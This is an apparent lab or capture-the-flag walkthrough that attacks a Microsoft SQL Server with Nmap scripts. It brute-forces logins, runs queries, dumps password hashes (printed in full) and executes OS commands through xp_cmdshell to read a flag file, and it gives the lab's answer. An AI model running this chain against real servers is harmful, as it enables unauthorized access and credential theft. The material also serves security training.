# MSSQL Nmap Scripts

1. Identify MSSQL Database Server

Just using nmap we can figure it out. The current version is Microsoft SQL Server 2019 15.00.2000.

**Note**: This database often uses port 1433.

Using the nmap script `ms-sql-info`, we can get a little bit more of information about the server.

| ms-sql-info: 
|   10.3.16.80:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433


2. Find information from the MSSQL server with NTLM.

To get more info about the server using NTLM we need to use the nmap script `ms-sql-ntlm-info` with script-args `mssql.instance-port=<port number>`.

| ms-sql-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393


3. Enumerate all valid MSSQL users and passwords

We can approach this task using the nmap script `ms-sql-brute` with script-args `userdb` and `passdb`.

| ms-sql-brute: 
|   [10.3.16.80:1433]
|     Credentials found:
|       auditor:jasmine1 => Login Success
|       admin:anamaria => Login Success
|_      dbadmin:bubbles1 => Login Success

4. Identify 'sa' user password

Running the nmap script `ms-sql-empty-password` we can get users that has empty password policy. In this case the user sa was found.

5. Execute MSSQL query to extract sysusers

Using the following nmap command `nmap x.x.x.x -p 1433 --script ms-sql-query --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt` we can execute a query to bring syslogins from the database. You can change the query to any other to get more information.

6. Dump MSSQL users hashes

Using the nmap script `ms-sql-dump-hashes` with script-args mssql.username mssql.password, we can get some hashes:

ms-sql-dump-hashes: 
| [10.3.20.243:1433]
|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b

Pretty useful later to perform pass the hash attacks for example.

7. Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)

Usin the nmap script `ms-sql-xp-cmdshell` with script-args mssql.username, mssql.password and ms-sql-xp-cmdshell.cmd we can try to execute commands in the remote machine using sql. We can get this output using the command `type C:\flag.txt`:

| ms-sql-xp-cmdshell: 
|   [10.3.20.243:1433]
|     Command: type c:\flag.txt
|       output
|       ======
|_      1d1803570245aa620446518b2154f324

**Note**: When you don't know what to do, the site of NSE can be a source for more scripts and ways to enumerate more and more information from other versions of sql or programs we don't really have an idea about.